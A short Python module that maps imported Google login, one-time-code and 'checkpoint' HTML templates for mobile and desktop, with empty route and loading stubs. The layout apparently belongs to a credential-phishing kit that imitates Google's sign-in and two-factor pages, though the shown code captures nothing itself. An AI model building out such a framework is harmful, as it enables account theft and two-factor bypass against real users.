"""route.py - Routes et templates Google (login uniquement)."""

from platforms.google.login import HTML_MOBILE_LOGIN, HTML_PC_LOGIN
from platforms.google.otp import HTML_OTP_MOBILE, HTML_OTP_PC
from platforms.google.checkpoint import HTML_CHECKPOINT

TEMPLATES = {
    "mobile_login": HTML_MOBILE_LOGIN,
    "pc_login": HTML_PC_LOGIN,
    "mobile_otp": HTML_OTP_MOBILE,
    "pc_otp": HTML_OTP_PC,
    "checkpoint": HTML_CHECKPOINT,
}

def get_template(key):
    return TEMPLATES.get(key)

def handle_loading(cfg):
    return None

def register_routes(app):
    pass
